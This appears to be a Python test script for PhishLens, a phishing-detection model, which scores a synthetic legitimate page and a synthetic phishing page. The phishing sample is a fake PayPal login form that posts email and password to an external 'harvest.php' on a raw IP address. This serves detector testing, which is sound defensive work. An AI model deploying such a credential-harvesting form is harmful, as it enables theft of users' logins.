import sys
sys.path.insert(0, "backend")

import joblib
import numpy as np
from features_dom import extract_dom_features_from_html, DOM_FEATURE_COLS

dom_model_pkg = joblib.load("backend/data/models/phishlens_dom_histgbt.pkl")
dom_model = dom_model_pkg["model"]

# 1. Realistic Legitimate Page (Rich DOM, 800 lines, high title match)
lines = ["<!DOCTYPE html>", "<html>", "<head>", "<title>Google Search</title>", "<script src='/bundle.js'></script>", "</head>", "<body>"]
lines += ["<div><a href='/help'>Help</a></div>"] * 800
lines += ["<form action='/search'><input name='q'/><input type='submit'/></form>", "</body>", "</html>"]
h_legit = "\n".join(lines)

f_legit = extract_dom_features_from_html(h_legit, page_url="https://www.google.com/search?q=security")
v_legit = np.array([[f_legit[k] for k in DOM_FEATURE_COLS]])
p_legit = dom_model.predict_proba(v_legit)[0]

print("=== 1. Legitimate Page Evaluation ===")
print("Features:", f_legit)
print(f"DOM Probabilities -> P(Legit): {p_legit[0]:.4f} | P(Phish): {p_legit[1]:.4f}")

# 2. Phishing Page (Minimal HTML, 15 lines, external form action, password input)
h_phish = """<!DOCTYPE html>
<html>
<head><title>Verify PayPal</title></head>
<body>
<h1>Please Confirm Your Login</h1>
<form action="http://103.114.163.238/harvest.php" method="POST">
  <input type="text" name="email" placeholder="Email"/>
  <input type="password" name="password" placeholder="Password"/>
  <button type="submit">Log In</button>
</form>
</body>
</html>"""

f_phish = extract_dom_features_from_html(h_phish, page_url="https://paypal-verify.account-security.xyz/login.php")
v_phish = np.array([[f_phish[k] for k in DOM_FEATURE_COLS]])
p_phish = dom_model.predict_proba(v_phish)[0]

print("\n=== 2. Phishing Page Evaluation ===")
print("Features:", f_phish)
print(f"DOM Probabilities -> P(Legit): {p_phish[0]:.4f} | P(Phish): {p_phish[1]:.4f}")
